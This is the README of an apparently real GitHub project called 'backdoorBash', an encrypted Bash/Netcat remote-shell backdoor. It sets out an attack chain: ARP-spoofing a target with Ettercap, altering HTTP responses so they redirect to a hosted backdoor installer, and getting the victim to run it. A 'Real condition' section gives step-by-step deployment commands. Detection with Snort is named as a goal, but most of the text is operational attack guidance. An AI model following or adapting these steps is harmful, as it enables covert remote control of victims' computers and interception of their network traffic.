backdoorBash
============

Unix remote-shell backdoor develop with Bash, Netcat, OpenSSL (data encryption with AES-128bit)

## Introduction

This project is associated to another mine : 
- https://github.com/pilebones/etterfilterSamples
- https://github.com/pilebones/hostingBackdoorInstaller

The main goals of this project is to implement an attack scenario as below : 
- Implement backdoor like remote-shell with Bash
- Attack Man In the middle with Ettercap (like ARP Spoofing)
- Hosting a backdoor installer
- Automate data alteration to inject our backdoor inside the computer of target by a browser
- If the target run (naively) the script (ie: the backdoor installer) without reading code source the computer is infected and the attacker can obtain a remote access command
- Detect and prevent this kind of attack with NIDS tool as Snort

Notice :
- The programming language was choose only for a Proof of Concept (POC)
- The socket layer is assumed by a portable version of Netcat. I compiled Netcat for i686 and x86_64 computer architecture a put the binary inside this project.
- The transmited data were encrypted with AES-128 (without using Cryptocat). The data are encrypted on the fly via OpenSSL.

## Requirements

- openssl (tested with v1.0.1j)
- ettercap (>= v0.8.1)
- etterfilter (>= v0.8.1)
- etterfilter (>= v0.8.1)
- netcat (The compiled version is "The GNU Netcat" [not BSD release] v0.7.1)

## How it work ?

The backdoor-client connection work localy and remontly (inside same private network with the same access-point), ie : see "$HOST" inside "config.sh".

### Simple test

```bash
git clone git@github.com:pilebones/backdoorBash.git
cd backdoorBash
cp config.sh.sample config.sh 
vim config.sh
./server.sh
HOST=192.168.0.x ./client.sh
```
.... And try to execute some shell command

### Real condition

```bash
git clone git@github.com:pilebones/backdoorBash.git
git clone git@github.com:pilebones/etterfilterSamples.git
git clone git@github.com:pilebones/hostingBackdoorInstaller.git
cp backdoorBash/config.sh.sample backdoorBash/config.sh
vim backdoorBash/config.sh
# For export remove client.sh *.log config.sh.sample
tar xvzf hostingBackdoorInstaller/export.tar.gz backdoorBash/
# Configure your vhost to hosting hostingBackdoorInstaller's project
cd etterfilterSamples/inject_backdoor_installer/
# Update Redirect URL from "fake-http-redirect.txt"
vim fake-http-redirect.txt
IFACE=wlanX IP_AP=192.168.0.1 IP_TARGET=192.168.0.x ./run
# From target try to download a shell script like "test.sh" or try with 404 Not Found page (same behavior => inject backdoor installer)
# From target : "chmod +x bd_installer.sh && ./bd_installer.sh"
HOST=192.168.0.x ./client.sh
```

## Limitations

This backdoor is writing in bash programming language => It work only on Unix OS.

Currently, tested only on :
- Archlinux
- Debian 7 
- Ubuntu 14.10

Warning : 
Some recent Routeur or Box or AP prevent this kind of MiTM attack. In this case, Ettercap could relay only one-way network-packets (From target to AP but not from AP to target). So Ettercap can alter the HTTP response to redirect to the backdoor's installer.
